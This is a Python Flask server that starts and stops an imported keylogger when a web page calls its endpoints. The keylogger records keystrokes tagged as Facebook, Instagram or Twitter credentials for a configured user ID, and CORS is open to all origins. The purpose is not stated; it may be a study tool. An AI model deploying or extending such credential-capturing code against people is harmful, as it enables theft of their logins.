import os
import sys
from dotenv import dotenv_values

from flask import Flask, jsonify, request
from flask_cors import CORS
from tools.keylogger import Keylogger
from base.displayer import CredentialType
from base.log import Logger

config = dotenv_values(".env")
user_id = config.get("FP_USER_ID")
if user_id is None:
    log = Logger()
    log.km_error("No FP_USER_ID environment variable set")
    sys.exit(1)
print("Loaded user id is:", user_id)
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, allow_headers=["Content-Type"])


# Handle CORS preflight OPTIONS requests
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        response = jsonify({"message": "CORS preflight passed"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        return response


keylogger_instance = None


@app.route("/start-server", methods=["POST"])
def start_server():
    global keylogger_instance
    print("Received start recording request from page")

    data = request.get_json()
    platform_id = str(data.get("platform_id"))
    print("Platform ID in request is:", platform_id)

    # If keylogger_instance is already running, do not create a new one
    if keylogger_instance is None:
        keylogger_instance = Keylogger(user_id)
        print("New Keylogger instance created")

    # Start recording for the given platform
    if platform_id == "0":
        keylogger_instance.start_recording(CredentialType.FACEBOOK, int(user_id))
    elif platform_id == "1":
        keylogger_instance.start_recording(CredentialType.INSTAGRAM, int(user_id))
    elif platform_id == "2":
        keylogger_instance.start_recording(CredentialType.TWITTER, int(user_id))

    return jsonify({"message": "200"}), 200


@app.route("/end-server", methods=["POST"])
def end_server():
    # When the server receives a request to this endpoint it indicates that the user is
    # finished and we should kill the Keylogger if it is running
    # TODO: rather than killing the server itself, I would rather have the Keylogger as a seperate process that the server
    #       starts and then just kill that
    os.system("kill %d" % os.getpid())
    return jsonify({"message": "200"})


if __name__ == "__main__":
    app.run(debug=True)
